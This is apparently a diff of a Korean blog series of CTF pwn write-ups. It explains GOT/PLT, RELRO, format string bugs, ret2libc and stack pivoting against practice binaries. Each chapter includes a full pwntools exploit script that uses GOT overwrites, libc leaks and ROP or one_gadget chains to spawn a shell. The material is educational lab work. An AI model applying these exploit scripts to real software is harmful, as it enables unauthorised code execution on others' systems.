 → 그래서 "주소를 **나중에(실행 중) 채워 넣을** 빈칸"이 필요하고. 그 빈칸들의 표가 **GOT(Global Offset Table)** 인 것이다. 
 
-##### Lazy binding (처음엔 빈칸이다)
+#### Lazy binding (처음엔 빈칸이다)
 
 효율 때문에 **처음 호출할 때** 주소를 채운다.
 
@@ -1678,7 +1678,7 @@ ibc는 **별도 파일**이고, **ASLR 때문에 매번 다른 주소**에 로�
 
 → 그래서 **한 번이라도 호출된 함수의 GOT 칸엔 "실제 libc 주소"가 들어있다.**
 
-##### Exploit 관점
+#### Exploit 관점
 
 GOT는 **데이터 영역**이라 두 가지로 악용된다.
 
@@ -1690,9 +1690,9 @@ GOT 칸엔 **libc 실제 주소**가 들어있으므로 그 칸을 읽으면 lib
 
 GOT 칸이 **쓰기 가능**(Partial RELRO)이면, 그 값을 바꿔치기할 수 있다.
 
-#### .got vs .got.plt
+### .got vs .got.plt
 
-##### 핵심 차이
+#### 핵심 차이
 
 |  | `.got` | `.got.plt` |
 | --- | --- | --- |
@@ -1701,12 +1701,12 @@ GOT 칸이 **쓰기 가능**(Partial RELRO)이면, 그 값을 바꿔치기할 �
 | 채우는 시점 | 보통 **시작할 때 바로** | **lazy binding** (처음 호출 때) |
 | 익스에서 | 덜 씀 | **GOT overwrite/leak 에 자주 쓰임** |
 
-##### lazy binding 때문에 나뉜다.
+#### lazy binding 때문에 나뉜다.
 
 - **함수(`.got.plt`)** → **처음 호출될 때까지 주소를 안 채운다** (lazy). (안 쓰는 함수 주소는 해석 안 해서 빠르다.) → 그래서 **"실행 중 써넣어야" 하니 쓰기 가능**해야 하므로 별도 섹션(`.got.plt`)으로 분리했다
 - **변수(`.got`)** → **시작하자마자 다 채운다** (변수는 바로 쓰이니까 미룰 이유가 없다). → 채우고 나면 안 바뀌어서 **잠가도(읽기전용) 무관하다.**
 
-##### 보호 기법: Partial RELRO vs Full RELRO
+#### 보호 기법: Partial RELRO vs Full RELRO
 
 - **Partial RELRO** → `.got.plt`가 **쓰기 가능** → GOT overwrite 가능하다.
 - **Full RELRO** → GOT가 **읽기 전용**으로 잠긴다 → overwrite 불가능하다.
@@ -1716,9 +1716,9 @@ GOT 칸이 **쓰기 가능**(Partial RELRO)이면, 그 값을 바꿔치기할 �
 
 ---
 
-#### 1. 대상 분석
+### 1. 대상 분석
 
-##### 1-1. 코드 분석
+#### 1-1. 코드 분석
 
 ```c
 unsigned long long wire[100];        // 전역 배열 (bss, 고정 주소)
@@ -1755,7 +1755,7 @@ int main(){
 > **카나리 leak이 불가능하다.** (이 프로그램은 사용자 데이터를 출력하는 곳이 전혀 없다 puts/printf 전부 고정 문자열). 따라서 **카나리도 libc도 읽어낼 방법이 없다.**
 > 
 
-##### 1-2. 보호기법 확인 (checksec)
+#### 1-2. 보호기법 확인 (checksec)
 
 ![image.png](/assets/img/posts/space-alone/ch7/image.png)
 
@@ -1767,9 +1767,9 @@ libc leak은 여전히 필요.
 
 ---
 
-#### 2. 익스플로잇 아이디어
+### 2. 익스플로잇 아이디어
 
-##### 2-1. canary 우회
+#### 2-1. canary 우회
 
 처음엔 menu 1으로 카나리를 leak 할 수 있지 않을까 생각했지만, **menu 1은 쓰기 전용**이고 코드를 보니 **출력
 수단 자체가 없다.**
@@ -1781,7 +1781,7 @@ libc leak은 여전히 필요.
 가리키면 **아무것도 안 하고 되돌아와 `leave; ret`이 정상 진행**된다. → 카나리 검사가 우회된다.
 > 
 
-##### 2-2. __stack_chk_fail 우회 원리
+#### 2-2. __stack_chk_fail 우회 원리
 
 **startup 에필로그(disass)**
 
@@ -1800,7 +1800,7 @@ ret
 `leave; ret` 정상 진행 →  **덮은 리턴주소로 ROP**
 - 즉 **카나리가 틀려도(아무 값으로 smash) 그냥 통과한다.**
 
-##### 2-3. win 없음·바이너리에 system 없음 → libc 필요
+#### 2-3. win 없음·바이너리에 system 없음 → libc 필요
 
 `system`이 바이너리에 없으므로, startup BOF로 리턴주소를 잡은 뒤 **libc의 system**을 써야 한다.(libc leak 필요)
 **`pop rdi; ret` 가젯은 바이너리에 존재**(0x4011fe)하므로, ROP로
@@ -1808,13 +1808,13 @@ ret
 
 ![image.png](/assets/img/posts/space-alone/ch7/image-1.png)
 
-##### 2-4. libc leak : puts(puts@got)
+#### 2-4. libc leak : puts(puts@got)
 
 startup BOF로 ROP를 심어 `puts(puts@got)`를 호출하면, **puts@got에 든 "libc의 실제 puts 주소"**
 가 출력된다 → `libc_base = leak - libc.sym['puts']`. 유출 후 **`main`으로 되돌아와(재진입)** 메뉴
 루프를 다시 돌려 2차 오버플로우를 한다.
 
-##### 2-5. 익스플로잇 구조(while(1) 반복문 이용)
+#### 2-5. 익스플로잇 구조(while(1) 반복문 이용)
 
 ```
 [1] GOT overwrite (menu 1): wire[-12] = ret 가젯  → __stack_chk_fail@got 덮어 카나리 우회
@@ -1826,9 +1826,9 @@ startup BOF로 ROP를 심어 `puts(puts@got)`를 호출하면, **puts@got에 든
 
 ---
 
-#### 3. 필요한 정보 확인
+### 3. 필요한 정보 확인
 
-##### 3-1. 주소 모으기
+#### 3-1. 주소 모으기
 
 |  | 값 | 출처 |
 | --- | --- | --- |
@@ -1840,7 +1840,7 @@ startup BOF로 ROP를 심어 `puts(puts@got)`를 호출하면, **puts@got에 든
 | `puts@plt` | 0x4010a0 | startup disasm `call 0x4010a0 <puts@plt>` |
 | `main` | 0x40129d | `nm ./got | grep -w main` |
 
-##### 3-2. OOB index 계산 (__stack_chk_fail@got 덮기)
+#### 3-2. OOB index 계산 (__stack_chk_fail@got 덮기)
 
 `wire[select]` 주소 = `wire + select*(원소 크기)`. 이게 `__stack_chk_fail@got`이 되게 하는 index:
 
@@ -1853,7 +1853,7 @@ select   = -0x60 / 8 = -12
 → **menu 1에서 index = -12, value = 0x40101a(ret)** 로 쓰면 `__stack_chk_fail@got`가 ret이 된다.
 (`select`가 `int`라 음수가 그대로 들어간다.)
 
-##### 3-3. startup 오프셋 (wish → 리턴주소)
+#### 3-3. startup 오프셋 (wish → 리턴주소)
 
 disass startup 기준: `wish = rbp-0x110`, `canary = rbp-0x8`, `return = rbp+0x8`.
 
@@ -1861,7 +1861,7 @@ disass startup 기준: `wish = rbp-0x110`, `canary = rbp-0x8`, `return = rbp+0x8
 오프셋 = (rbp+0x8) - (rbp-0x110) = 0x118 = 280   (read 0x200=512 크기 한도? 내이다.)
 ```
 
-##### 3-4. libc 가젯 (libc leak 후)
+#### 3-4. libc 가젯 (libc leak 후)
 
 `libc.address`를 세팅하면 pwntools가 전부 실제 주소로 돌려준다:
 
@@ -1873,7 +1873,7 @@ disass startup 기준: `wish = rbp-0x110`, `canary = rbp-0x8`, `return = rbp+0x8
 
 ---
 
-#### 4. Exploit
+### 4. Exploit
 
 ```python
 from pwn import *
@@ -1900,17 +1900,17 @@ def overflow(payload):                   # menu2 : startup read 오버플로우
     p.sendlineafter(b'> ', b'2')
     p.sendafter(b'Hope the car starts!\n', payload)
 
-### 카나리 우회 : __stack_chk_fail@got = ret
+# 카나리 우회 : __stack_chk_fail@got = ret
 got_write(-12, RET)                      # wire[-12] = __stack_chk_fail@got
 
-### libc leak : puts(puts@got) → main 재진입
+# libc leak : puts(puts@got) → main 재진입
 overflow(b'A'*OFF + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN))
 leak = u64(p.recvline().strip().ljust(8, b'\x00'))
 libc.address = leak - libc.sym['puts']
 log.success('libc base = %#x' % libc.address)
 assert libc.address & 0xfff == 0, "libc base 정렬 안 맞음"
-### libc base는 반드시 000으로 끝난다.
-### system("/bin/sh")
+# libc base는 반드시 000으로 끝난다.
+# system("/bin/sh")
 binsh  = next(libc.search(b'/bin/sh\x00'))
 system = libc.sym['system']
 overflow(b'A'*OFF + p64(POP_RDI) + p64(binsh) + p64(RET) + p64(system))
@@ -1918,7 +1918,7 @@ overflow(b'A'*OFF + p64(POP_RDI) + p64(binsh) + p64(RET) + p64(system))
 p.interactive()
 ```
 
-##### payload 구조
+#### payload 구조
 
 ```
 [ 'A'×0x118 ][ pop_rdi ][ puts@got ][ puts@plt ][ main ]
@@ -1926,7 +1926,7 @@ p.interactive()
                 puts(puts@got) → libc puts 실제주소 출력 → main 재진입
 ```
 
-##### ROP 흐름
+#### ROP 흐름
 
 - **[2]** `pop rdi → puts@got` → `puts@plt` 실행 → puts가 **puts@got의 값(libc 주소)** 출력 →
 `main`으로 복귀 → 루프 재시작
@@ -1934,7 +1934,7 @@ p.interactive()
 
 ---
 
-#### 5. 클리어
+### 5. 클리어
 
 ![image.png](/assets/img/posts/space-alone/ch7/image-2.png)
 
@@ -1951,7 +1951,7 @@ p.interactive()
 
 ---
 
-#### 0. printf()
+### 0. printf()
 
 ```c
 printf("%s %d", name, age);
@@ -1966,7 +1966,7 @@ printf("%s %d", name, age);
     - `%x`  → 다음 인자를 “16진수(정수)”로 출력
     - `%n`  → 지금까지 출력한 바이트 수를 인자가 가리키는 주소에 int(4bytes)로 쓰기 (%hn: 2bytes, %hhn: 1byte)
 
-##### printf는 "인자가 몇 개인지" 모른다
+#### printf는 "인자가 몇 개인지" 모른다
 
 printf는 **포맷 문자열에 `%`가 몇 개 있는지로** 인자를 꺼내 작동한다. 즉 **실제로 몇 개를 넘겨받았는지 별도의 확인 절차가 존재하지 않는다.**
 
@@ -1985,7 +1985,7 @@ printf(포맷, 인자1, 인자2, ...)
 > printf(”%p %p”); 를 작동시키면 ,별도의 인자가 주어지지 않았어도 이 자리(레지스터/스택)에 있는 값 2개를 그냥 꺼내서 출력해버린다.
 > 
 
-##### 0-1. fsb 바이너리 case1
+#### 0-1. fsb 바이너리 case1
 
 **보통의 경우**
 
@@ -2008,9 +2008,9 @@ printf(buf);
 
 ---
 
-#### 1. 대상 분석
+### 1. 대상 분석
 
-##### 1-1. 코드 분석
+#### 1-1. 코드 분석
 
 case 1에서
 
@@ -2023,7 +2023,7 @@ if(strstr(buf, "Painkiller") || strstr(buf, "Morphine") || strstr(buf, "ibuprofe
 }
 ```
 
-##### 1-2. 보호기법 분석
+#### 1-2. 보호기법 분석
 
 ![image.png](/assets/img/posts/space-alone/ch8/image-1.png)
 
@@ -2036,15 +2036,15 @@ No PIE → exploit 하드 코딩 가능.
 
 ---
 
-#### 2. Exploit 아이디어
+### 2. Exploit 아이디어
 
-##### 2-1. buf에 `%p`를 넣어 메모리 leak
+#### 2-1. buf에 `%p`를 넣어 메모리 leak
 
 case 1에 `AAAA.%p.%p.%p.%p` 를 입력하면 `printf("AAAA.%p.%p.%p.%p")`가 되고 아래처럼 memory leak이 일어나는 걸 확인할 수 있다. 이걸 이용해, 스택에서 원하는 주소, 카나리, libc값 등을 바로바로 leak 할 수 있다.
 
 ![image.png](/assets/img/posts/space-alone/ch8/image-2.png)
 
-##### 2-2. buf에 `%n`을 넣어 메모리 쓰기
+#### 2-2. buf에 `%n`을 넣어 메모리 쓰기
 
 `%n`: **"지금까지 출력한 바이트 수"를, 해당 인자가 가리키는 주소에 써넣는다.**
 
@@ -2085,7 +2085,7 @@ int main() {
 > | `%n` | **다음 순서**의 인자를 꺼내 사용한다 (앞에서 `%`들을 몇 개 썼는지에 따라 위치가 밀린다) |
 > | `%6$n` | **무조건 6번째** 인자를 집어서 사용한다 (순서 상관없이) |
 
-##### FSB (Format String Bug)
+#### FSB (Format String Bug)
 
 | 포맷 | 능력 |
 | --- | --- |
@@ -2106,9 +2106,9 @@ win함수(`open_emergency_medicne`)가 존재한다. %n으로 `puts@got`을 win 
 
 ---
 
-#### 3. 필요한 정보 확인
+### 3. 필요한 정보 확인
 
-##### 3-1. FSB Offset
+#### 3-1. FSB Offset
 
 ![image.png](/assets/img/posts/space-alone/ch8/image-5.png)
 
@@ -2134,13 +2134,13 @@ buf = [ puts@got 8바이트 ][ %(값)c ][ %8$n ]
          8번째 인자 자리에 옴     "8번째가 가리키는 주소에 써라"
 ```
 
-##### 3-2. Win 함수 주소
+#### 3-2. Win 함수 주소
 
 ![image.png](/assets/img/posts/space-alone/ch8/image-6.png)
 
 **win: 0x401256**
 
-##### 3-3. puts@got 주소
+#### 3-3. puts@got 주소
 
 ![image.png](/assets/img/posts/space-alone/ch8/image-7.png)
 
@@ -2148,7 +2148,7 @@ buf = [ puts@got 8바이트 ][ %(값)c ][ %8$n ]
 
 ---
 
-##### 4. Exploit
+#### 4. Exploit
 
 ```python
 from pwn import *
@@ -2162,21 +2162,21 @@ TARGET   = 0x401256   # open_emergency_medicine
 
 p = process('./fsb')
 
-### case 1(search medicine) 선택 -> printf(buf)로 FSB
+# case 1(search medicine) 선택 -> printf(buf)로 FSB
 p.sendlineafter(b'> ', b'1')
 
-### puts@got 에 open_emergency_medicine 주소 써넣기
-### pwntools의 fmtstr_payload 이용
+# puts@got 에 open_emergency_medicine 주소 써넣기
+# pwntools의 fmtstr_payload 이용
 payload = fmtstr_payload(OFFSET, {PUTS_GOT: TARGET})
 p.sendline(payload)
 
-### 이후 puts가 호출되는 시점에 open_emergency_medicine 실행 -> flag 출력
+# 이후 puts가 호출되는 시점에 open_emergency_medicine 실행 -> flag 출력
 p.interactive()
 ```
 
 SIGSEGV가 뜨며 하지만 flag가 안읽어진다…
 
-##### 4-1. Exploit 수정
+#### 4-1. Exploit 수정
 
 처음엔 위처럼 **`puts@got`를 win 함수로 덮는** 방향으로 짰다. payload 쓰기도 성공했는데 **flag가 한 글자도 안 나오고 SIGSEGV**가 떴다(아래 부록 참고). 결론만 말하자면 **덮을 대상을 `printf@got`로 바꿔야** 했다.
 
@@ -2197,15 +2197,15 @@ p.interactive()   # menu()의 printf("> ") 호출 시점에 win 함수 실행 ->
 
 ---
 
-#### 5. 클리어
+### 5. 클리어
 
 ![image.png](/assets/img/posts/space-alone/ch8/image-8.png)
 
 ---
 
-#### 6. 부록
+### 6. 부록
 
-##### `puts@got` 덮었더니 무한 재귀 → SIGSEGV
+#### `puts@got` 덮었더니 무한 재귀 → SIGSEGV
 
 디버그 로그를 보니 payload 쓰기(puts@got = 0x401256)는 **성공**했는데도 flag가 안 나오고 터졌다. 
 
@@ -2232,7 +2232,7 @@ menu의 puts → win 함수 실행
 
 **무한 재귀 → 스택 폭발 → SIGSEGV.** flag가 한 글자도 안 나온 이유도 이거였다. `puts(flag)`가 출력을 안 하고 자기 자신(win 함수)으로 되돌아가버리니까.
 
-##### `printf@got`로 교체 후 해결
+#### `printf@got`로 교체 후 해결
 
 win 함수가 쓰는 건 **open, read, puts, close**  즉, **printf는 안 쓴다.** 반대로 **menu()는 맨 끝에 `printf("> ")`를 호출**한다(`0x40138f`). 그래서 **`printf@got`를 덮으면**:
 
@@ -2257,9 +2257,9 @@ menu() 실행
 
 ---
 
-#### 1. 대상 분석
+### 1. 대상 분석
 
-##### 1-1. 문제 코드 확인
+#### 1-1. 문제 코드 확인
 
 ```c
 #include <stdio.h>
@@ -2302,7 +2302,7 @@ int main(void)
 }
 ```
 
-##### 1-2. 보호 기법 확인
+#### 1-2. 보호 기법 확인
 
 ![image.png](/assets/img/posts/space-alone/ch9/image.png)
 
@@ -2315,11 +2315,11 @@ No PIE → 하드 코딩 가능
 
 ---
 
-#### 2. Exploit 아이디어
+### 2. Exploit 아이디어
 
 GOT도 못 덮고 셸코드도 못 넣으니, 남은 방법은 **이미 메모리에 올라온 libc 함수(`system`)를 ROP로 호출**하는 **ret2libc** 이다.
 
-##### 2-1. ret2libc
+#### 2-1. ret2libc
 
 NX 때문에 "내 셸코드를 주입하고 실행"은 안 되지만, **libc에는 이미 `system`도 있고 `"/bin/sh"` 문자열도 있다.** 리턴 주소를 조작해서 `system("/bin/sh")`가 호출되도록 스택을 짜면, 새 코드를 주입하지 않고도 셸을 딴다.
 
@@ -2341,7 +2341,7 @@ NX 때문에 "내 셸코드를 주입하고 실행"은 안 되지만, **libc에�
 > ```
 > 
 
-##### 2-2. libc 주소 leak (ASLR 우회)
+#### 2-2. libc 주소 leak (ASLR 우회)
 
 ret2libc의 전제는 **`system`의 주소를 아는 것**인데, libc는 **ASLR** 때문에 실행할 때마다 로드 주소가 바뀐다. 그래서 먼저 **libc 함수 하나의 실제 주소를 유출시키고(leak)**, 이를 이용해 libc 베이스를 역산해야 한다.
 
@@ -2359,7 +2359,7 @@ libc 베이스를 구하면 `system`, `"/bin/sh"` 주소도 전부 계산 가능
 > No PIE는 **바이너리(main, gadget, plt 등)** 주소만 고정시킨다. **libc는 별개의 라이브러리**라서 여전히 ASLR로 매번 옮겨진다. 그래서 바이너리 주소는 하드코딩할 수 있지만, libc 주소는 leak으로 알아내야 한다.
 > 
 
-##### 2-3. `loop` 문제 우회
+#### 2-3. `loop` 문제 우회
 
 ret2libc는 보통 **2단계**로 진행한다.
 
@@ -2394,7 +2394,7 @@ read(0, buf, 0x70);
 
 → 1단계 체인 끝에서 main이 아니라 **`0x401256`(read 셋업 지점)으로 복귀**시키면, `if(loop)` 검사를 통째로 건너뛰고 **read를 또 받는다.** No PIE라 이 주소도 고정이라 하드코딩 가능하다.
 
-##### 2-4. 2단계 구조 정리
+#### 2-4. 2단계 구조 정리
 
 ```
 [1단계] BOF -> pop rdi; puts@got -> puts@plt (libc puts 주소 leak)
@@ -2417,9 +2417,9 @@ main이 `return 0` 할 때 `leave`가 실행되며 **rbp가 우리가 덮은 sav
 
 ---
 
-#### 3. 필요한 정보 확인
+### 3. 필요한 정보 확인
 
-##### 3-1. Offset 계산
+#### 3-1. Offset 계산
 
 ```c
 objdump -d ./pivot | grep -A30 '<main>:'
@@ -2432,7 +2432,7 @@ read 호출 직전에 lea 확인. 0x30이 buf와 rbp 사이의 거리.
 - RET(리턴 주소) = rbp + 8
 - offset = 48(0x30) + 8 = 56
 
-##### 3-2 .gadget 주소 확인
+#### 3-2 .gadget 주소 확인
 
 **바이너리 안의 gadget함수 가젯 확인**
 
@@ -2454,7 +2454,7 @@ ROPgadget --binary ./pivot | grep ': ret$'
 
 - **정렬용 gadget: 0x40101a**
 
-##### 3-3. puts 관련 주소 확인
+#### 3-3. puts 관련 주소 확인
 
 ```c
 objdump -d ./바이너리 | grep '<puts@plt>'   # puts@plt (호출할 함수)
@@ -2466,7 +2466,7 @@ objdump -R ./바이너리 | grep puts           # puts@got (leak할 대상)
 - **puts@plt: 0x401070**
 - **puts@got: 0x403fd0**
 
-##### 3-4. read 호출 지점 확인
+#### 3-4. read 호출 지점 확인
 
 ```c
 objdump -d ./pivot | grep -A30 '<main>:'
@@ -2489,7 +2489,7 @@ objdump -d ./pivot | grep -A30 '<main>:'
 
 - **read 복귀 지점: 0x401256**
 
-##### 3-5. main 주소 확인
+#### 3-5. main 주소 확인
 
 ```c
 nm ./pivot | grep 'main'
@@ -2501,7 +2501,7 @@ nm ./pivot | grep 'main'
 
 ---
 
-#### 4. Exploit
+### 4. Exploit
 
 ```c
 from pwn import *
@@ -2510,7 +2510,7 @@ context.arch = 'amd64'
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
 p = process('./pivot')
 
-### 주소 
+# 주소 
 off       = 0x38
 POP_RDI   = 0x4011e5
 RET       = 0x40101a
@@ -2519,8 +2519,8 @@ PUTS_GOT  = 0x403fd0
 MAIN_READ = 0x401256
 FAKE_RBP  = 0x404800
 
-### 1단계: libc leak 
-### puts(puts@got) -> 실제 puts 주소 출력 -> read 지점으로 복귀
+# 1단계: libc leak 
+# puts(puts@got) -> 실제 puts 주소 출력 -> read 지점으로 복귀
 stage1  = b'A'*0x30                 # buf 채우기
 stage1 += p64(FAKE_RBP)             # saved rbp (프레임 안정화)
 stage1 += p64(POP_RDI) + p64(PUTS_GOT)
@@ -2536,7 +2536,7 @@ log.info("puts leak = %#x", leak)
 log.info("libc base = %#x", libc.address)
 assert libc.address & 0xfff == 0    # 페이지 정렬 확인 (base가 맞으면 끝 3자리 000)
 
-### 2단계: system("/bin/sh")
+# 2단계: system("/bin/sh")
 binsh  = next(libc.search(b'/bin/sh\x00'))
 system = libc.sym['system']
 
@@ -2552,7 +2552,7 @@ p.interactive()
 
 ---
 
-#### 5. Clear
+### 5. Clear
 
 ![image.png](/assets/img/posts/space-alone/ch9/image-7.png)
 
@@ -2569,9 +2569,9 @@ p.interactive()
 
 ---
 
-#### 1. 대상 분석
+### 1. 대상 분석
 
-##### 1-1. 문제 코드 확인
+#### 1-1. 문제 코드 확인
 
 **전체 코드**
 
@@ -2773,7 +2773,7 @@ case 0:    fprintf(access_log, passwd);  // ★ passwd = 내 입력, %n으로 �
 > `%p`/`%s`는 **출력(leak)**이라 어디로 출력되는지가 중요해(파일로 가면 안 보임). 근데 `%n`은 **메모리에 쓰는 것**이라 출력 대상이 파일이든 화면이든 상관없이 **포인터가 가리키는 주소에 값을 써.** 그래서 leak은 stdout으로 나오는 ①번으로, write는 파일로 나가는 ②번으로 역할 분담.
 > 
 
-##### 1-2. 보호기법 확인
+#### 1-2. 보호기법 확인
 
 ![image.png](/assets/img/posts/space-alone/ch10/image.png)
 
@@ -2790,7 +2790,7 @@ But you have writable place
 알려주고 있다.
 ```
 
-#### 2. Exploit 아이디어
+### 2. Exploit 아이디어
 
 Full RELRO라 GOT를 못 덮으니, **쓰기 타겟은 "스택의 리턴 주소"**가 유력해:
 
@@ -2818,7 +2818,7 @@ context.arch = 'amd64'
 p = process('./final')
 ONE_GADGET = 0xebc18        # 안 되면 교체
 
-### ---- Round 1: leak (case 3) ----
+# ---- Round 1: leak (case 3) ----
 p.sendafter(b'Your ID : ', b'%6$p.%31$p.%33$p\n')
 data = p.recvuntil(b'!Invalid!')
 argv_leak, canary, libc_leak = [int(h,16) for h in re.findall(rb'0x[0-9a-f]+', data)[:3]]
@@ -2828,12 +2828,12 @@ og        = libc_base + ONE_GADGET
 FAKE_RBP  = main_rbp
 log.info("canary=%#x libc=%#x main_rbp=%#x og=%#x", canary, libc_base, main_rbp, og)
 
-### ---- Round 2: BOF (case 2 Doctor) → main 리턴 덮기 ----
+# ---- Round 2: BOF (case 2 Doctor) → main 리턴 덮기 ----
 p.sendafter(b'Your ID : ', b'Doctor\n')
 bof = b'A'*0x48 + p64(canary) + p64(FAKE_RBP) + p64(og)
 p.sendafter(b'Password : ', bof)
 
-### ---- Round 3: count==3 유도 → main return → og ----
+# ---- Round 3: count==3 유도 → main return → og ----
 p.sendafter(b'Your ID : ', b'A\n')
 p.interactive()
 ```
@@ -2848,11 +2848,11 @@ p.interactive()
 
 ---
 
-#### 0. 두 개의 취약점을 먼저 이해하기
+### 0. 두 개의 취약점을 먼저 이해하기
 
 이 문제는 버그가 **두 군데**에 있고, 역할이 다르다. 이걸 먼저 잡고 가야 전체가 보인다.
 
-##### 버그 1: FSB (Format String Bug) — case 3의 `printf(id_number)`
+#### 버그 1: FSB (Format String Bug) — case 3의 `printf(id_number)`
 
 ```c
 case 3:
@@ -2861,7 +2861,7 @@ case 3:
 
 이전의 문제에 존재한 `printf(buf)`처럼 **사용자 입력이 포맷 문자열 자리**에 들어간다. `%p`를 넣으면 스택 값을 꺼내 출력(**leak**)할 수 있다. 출력이 **stdout으로 나와서** leak 결과를 눈으로 볼 수 있다. → **leak 전용**으로 사용.
 
-##### 버그 2: BOF (Buffer Overflow) — check_passwd의 `read`
+#### 버그 2: BOF (Buffer Overflow) — check_passwd의 `read`
 
 ```c
 char password[0x40];        // 64바이트 버퍼
@@ -2875,9 +2875,9 @@ read(0, passwd, 100);       // 100바이트를 읽음 -> 36바이트 오버플�
 
 ---
 
-#### 1. 대상 분석
+### 1. 대상 분석
 
-##### 1-1. 코드 분석
+#### 1-1. 코드 분석
 
 ```c
 int loop = 0;               // (이 문제엔 사실상 영향 없음)
@@ -2923,7 +2923,7 @@ int main() {
 2. **case 2(Doctor) 도달법** — ID에 "Doctor" → `check_passwd` → `read(100)` BOF.
 3. **main 리턴 시점** — `count == 3`이면 `return 0`. 즉 **3라운드째에 main이 리턴**한다. (여기에 익스를 건다)
 
-##### 1-2. 보호기법 확인
+#### 1-2. 보호기법 확인
 
 ![image.png](/assets/img/posts/space-alone/ch10/image-2.png)
 
@@ -2938,9 +2938,9 @@ All Green. 하드코딩할 수 있는 게 아무것도 없어서, **필요한 �
 
 ---
 
-#### 2. Exploit 아이디어
+### 2. Exploit 아이디어
 
-##### 2-1. 전체 그림 (3번 시도)
+#### 2-1. 전체 그림 (3번 시도)
 
 ```
 [1] case 3: printf(id_number) FSB로 leak
@@ -2950,7 +2950,7 @@ All Green. 하드코딩할 수 있는 게 아무것도 없어서, **필요한 �
 [3] case 3: count==3 유도 -> main이 return -> one_gadget 실행 -> 셸 획득.
 ```
 
-##### 2-2. ret2libc / one_gadget
+#### 2-2. ret2libc / one_gadget
 
 - **NX**라서 셸코드를 못 올린다 → 이미 메모리에 있는 libc 코드를 재사용(ret2libc).
 - **Full RELRO**라 GOT를 못 덮는다 → 쓰기 타겟을 **스택의 리턴 주소**로.
@@ -2960,7 +2960,7 @@ All Green. 하드코딩할 수 있는 게 아무것도 없어서, **필요한 �
 libc 안에는 `execve("/bin/sh", argv, envp)`를 바로 실행해주는 지점들이 있다. `one_gadget libc.so.6`로 후보를 뽑으면, 각 후보마다 **발동 조건(constraints)**이 붙어 있다. (예: `0xebc18`은 "`[rbp-0x78]`과 `[rbp-0x70]`이 NULL(또는 유효한 argv/envp)이어야" execve가 성공한다.) 조건이 안 맞으면 터진다(SIGSEGV).
 > 
 
-##### 2-3. 카나리 우회
+#### 2-3. 카나리 우회
 
 BOF로 리턴 주소를 덮으려면 중간의 **카나리**를 지나쳐야 하는데, 카나리가 바뀌면 함수 종료 시 탐지되어 죽는다. 하지만 **첫 번째 단계에서 카나리를 leak**해두고, BOF payload에 **원래 카나리 값을 그대로 다시 써넣어서** 탐지를 통과할 수 있다.
 
@@ -2970,9 +2970,9 @@ BOF로 리턴 주소를 덮으려면 중간의 **카나리**를 지나쳐야 하
 
 ---
 
-#### 3. 필요한 정보 확인
+### 3. 필요한 정보 확인
 
-##### 3-1. FSB leak 오프셋 (printf 기준)
+#### 3-1. FSB leak 오프셋 (printf 기준)
 
 case 3에 `%p`를 쭉 넣어 스택을 확인하고, gdb로 각 위치가 뭔지 확인한다.
 
@@ -2987,7 +2987,7 @@ gdb 덤프에서 찾은 위치:
 | 카나리 | `%31$p` | 그대로 사용 |
 | libc | `%33$p` (=`__libc_start_call_main+128`) | `libc_base = leak - 0x29d90` |
 
-##### 3-2. BOF Offset
+#### 3-2. BOF Offset
 
 gdb에서 `password`가 `main_rbp - 0x50`에 있는 걸 확인했다. 카나리는 `main_rbp - 0x8`.
 
@@ -2999,11 +2999,11 @@ password[0] ── (0x48 바이트) ── 카나리(rbp-0x8) ── saved rbp(r
 - payload 구조: `'A'*0x48 + canary + FAKE_RBP + one_gadget`
 - 길이: 0x48 + 8 + 8 + 8 = 0x60 = 96바이트 (read 100 안에 작성 가능하다.)
 
-##### 3-3. 쓰기 타겟 == main의 리턴 주소
+#### 3-3. 쓰기 타겟 == main의 리턴 주소
 
 BOF가 덮는 `passwd`는 **main의 `password` 버퍼**(포인터로 넘어옴)다. 그래서 오버플로우는 **main의 프레임**(카나리·saved rbp·리턴)을 덮는다. → main이 `count==3`에 리턴할 때 one_gadget이 발동.
 
-##### 3-4. one_gadget
+#### 3-4. one_gadget
 
 ```bash
 one_gadget /lib/x86_64-linux-gnu/libc.so.6
@@ -3013,7 +3013,7 @@ one_gadget /lib/x86_64-linux-gnu/libc.so.6
 
 ---
 
-#### 4. Exploit
+### 4. Exploit
 
 ```python
 from pwn import *
@@ -3023,7 +3023,7 @@ context.arch = 'amd64'
 p = process('./final')
 ONE_GADGET = 0xebc18
 
-### 1: leak (case 3)
+# 1: leak (case 3)
 p.sendafter(b'Your ID : ', b'%6$p.%31$p.%33$p\n')   # 인식 안 되는 ID -> case 3
 data = p.recvuntil(b'!Invalid!')
 argv_leak, canary, libc_leak = [int(h,16) for h in re.findall(rb'0x[0-9a-f]+', data)[:3]]
@@ -3033,12 +3033,12 @@ og        = libc_base + ONE_GADGET
 FAKE_RBP  = main_rbp
 log.info("canary=%#x libc=%#x main_rbp=%#x og=%#x", canary, libc_base, main_rbp, og)
 
-### Round 2: BOF (case 2 Doctor)
+# Round 2: BOF (case 2 Doctor)
 p.sendafter(b'Your ID : ', b'Doctor\n')
 bof = b'A'*0x48 + p64(canary) + p64(FAKE_RBP) + p64(og)
 p.sendafter(b'Password : ', bof)                    # read(100) > password[0x40] -> 오버플로우
 
-### Round 3: count==3 유도 -> main return -> og 
+# Round 3: count==3 유도 -> main return -> og 
 p.sendafter(b'Your ID : ', b'A\n')
 p.interactive()
 ```
@@ -3049,7 +3049,7 @@ p.interactive()
 
 ---
 
-#### 5. 클리어
+### 5. 클리어
 
 ![image.png](/assets/img/posts/space-alone/ch10/image-3.png)
 
@@ -3057,9 +3057,9 @@ Round 3에서 `count==3` → `puts("BOOM!! Find your ID")` 후 main이 `return` 
 
 ---
 
-#### 6. 부록
+### 6. 부록
 
-##### 처음엔 `fprintf(passwd)` FSB의 `%n`으로 풀려고 했다 → 실패
+#### 처음엔 `fprintf(passwd)` FSB의 `%n`으로 풀려고 했다 → 실패
 
 원래 계획은 2**번 취약점을 FSB로** 보고, `fprintf(access_log, passwd)`의 `%n`으로 **check_passwd의 리턴 주소를 one_gadget으로 덮는** 것이었다.
 
@@ -3079,27 +3079,27 @@ leak offset(27), write_target 다 정확히 맞췄는데도 **계속 SIGSEGV가 
 > `fprintf`/`printf`의 positional `%n` 쓰기는 중간 인자 gap 때문에 주소가 잘릴 수 있다. 이럴 땐 `%n`을 고집하지 말고 다른 쓰기 수단(여기선 BOF)을 찾는 게 빠르다.
 > 
 
-##### one_gadget 후보를 무작정 바꿨다
